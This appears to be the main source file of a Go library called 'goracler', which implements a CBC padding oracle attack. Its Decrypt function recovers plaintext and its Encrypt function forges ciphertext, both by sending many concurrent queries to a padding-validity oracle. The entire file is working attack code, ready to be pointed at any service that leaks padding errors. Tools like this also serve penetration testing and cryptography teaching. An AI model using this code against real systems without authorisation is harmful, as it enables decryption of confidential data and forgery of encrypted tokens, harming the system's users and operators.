package goracler

import (
	"context"
	"errors"
	"log"
	"sync"

	"github.com/manelmontilla/goracler/crypto"
)

var (
	// ErrInvalidCiphertext is returned by the Decrypt function when
	// the cyphertext passed in is malformed.
	ErrInvalidCiphertext = errors.New("invalid ciphertext")

	// CipherBlockLen defines the length in bytes of the block cipher.
	CipherBlockLen = 16

	// MaxGoroutines the maximun number of wokers making queries concurrently to the
	// oracle.
	MaxGoroutines = 20
)

// Poracle defines the shape of the oracle querier needed by the library.
type Poracle interface {
	// Do queires the oracle with the cyphertext defined in the c param. It
	// returns 0 if the pad returned by the Oracle is invalid
	Do(c []byte) (int, error)
}

// Decrypt performs a decrypt attack using the given ciphertext and oracle
// querier. The block length it uses is defined in the var CipherBlockLen. It
// uses the logger l to write info about the status of the attack.
func Decrypt(c []byte, q Poracle, l log.Logger) (string, error) {
	n := len(c) / CipherBlockLen
	if n < 2 {
		return "", ErrInvalidCiphertext
	}
	if len(c)%CipherBlockLen != 0 {
		return "", ErrInvalidCiphertext
	}
	// The clear text have the same length as the cyphertext - 1
	// (the IV).
	var m []byte
	for i := 1; i < n; i++ {
		c0 := c[(i-1)*CipherBlockLen : CipherBlockLen*(i-1)+CipherBlockLen]
		c1 := c[CipherBlockLen*i : (CipherBlockLen*i)+CipherBlockLen]
		l.Printf("\ndecripting block %d of %d", i, n)
		mi, err := decryptBlock(c0, c1, q, l)
		if err != nil {
			return "", err
		}
		m = append(m, mi...)
	}
	return string(m), nil
}

// Encrypt performs an encrypt attack using the given ciphertext and oracle
// querier. The block length it uses is defined in the var CipherBlockLen. It
// uses the logger l to write info about the status of the attack.
func Encrypt(txt string, q Poracle, l log.Logger) ([]byte, error) {
	ctext := crypto.PCKCS5Pad([]byte(txt))
	n := len(ctext) / CipherBlockLen

	// The clear text have the same length as the cyphertext - 1
	// (the IV).
	var im []byte
	var c1 = make([]byte, CipherBlockLen, CipherBlockLen)
	var c0 = make([]byte, CipherBlockLen, CipherBlockLen)

	// Last block of the encrypted value is not related to the
	// text to encrypt, can contain any value.
	var c []byte
	c = append(c, c1...)
	for i := n - 1; i >= 0; i-- {
		di, err := decryptBlock(c0, c1, q, l)
		if err != nil {
			return nil, err
		}
		mi := di
		im = append(im, mi...)
		ti := ctext[CipherBlockLen*i : (CipherBlockLen*i)+CipherBlockLen]
		c1 = crypto.BlockXOR(ti, mi)
		c = append(c1, c...)
	}
	return c, nil
}

func decryptBlock(prev, current []byte, q Poracle, l log.Logger) ([]byte, error) {
	var mi = make([]byte, CipherBlockLen)
	for p := CipherBlockLen - 1; p >= 0; p-- {
		// Generate a channel with values from 0 to 255.
		var values = make(chan byte, 256)
		for g := 0; g < 256; g++ {
			if byte(g) == prev[p] && p == CipherBlockLen-1 {
				continue
			}
			values <- byte(g)
		}
		close(values)

		// Create workers.
		var wg sync.WaitGroup
		ctx, cancel := context.WithCancel(context.Background())
		done := make(chan checkValueRes, 256)
		for i := 0; i < MaxGoroutines; i++ {
			wg.Add(1)
			w := oracleWorker{ctx, cancel, &wg, prev, current, q, mi, p, values, done, l}
			go w.checkValuePad()
		}

		// Wait until all the workers have finished.
		wg.Wait()
		close(done)

		// Get the results from the done channel.
		var val byte
		found := false
		for res := range done {
			if res.Err != nil {
				return nil, res.Err
			}
			val = res.Res
			found = true
		}
		if !found {
			return nil, errors.New("no byte found after a valid attempt")
		}
		mi[p] = val ^ prev[p] ^ (byte(CipherBlockLen) - byte(p))
	}
	return mi, nil
}

type checkValueRes struct {
	Err error
	Res byte
}

type oracleWorker struct {
	ctx           context.Context
	cancel        context.CancelFunc
	wg            *sync.WaitGroup
	prev, current []byte
	querier       Poracle
	mi            []byte
	p             int
	read          <-chan byte
	done          chan<- checkValueRes
	l             log.Logger
}

func (o oracleWorker) checkValuePad() {
	defer o.wg.Done()
LOOP:
	for {
		select {
		case g, open := <-o.read:
			if !open {
				break LOOP
			}
			cg := buildPad(o.p, byte(g), o.prev, o.mi)
			try := append(cg, o.current...)
			res, err := o.querier.Do(try)
			if err != nil {
				o.done <- checkValueRes{Err: err}
				o.cancel()
				break LOOP
			}
			if res > 0 {
				o.done <- checkValueRes{Res: g}
				o.l.Printf("\ndecrypted byte %d value: %d", o.p, g)
				o.cancel()
				break LOOP
			}
		case <-o.ctx.Done():
			break LOOP
		}
	}
}

func buildPad(p int, g byte, c []byte, m []byte) []byte {
	pad := byte(CipherBlockLen) - byte(p)
	rg := make([]byte, CipherBlockLen)
	fill := pad
	for i := CipherBlockLen - 1; i >= 0; i-- {
		if fill < 1 {
			rg[i] = c[i]
			continue
		}
		if p == i {
			rg[i] = g
		} else {
			rg[i] = pad ^ m[i] ^ c[i]
		}

		fill--
	}
	return rg
}
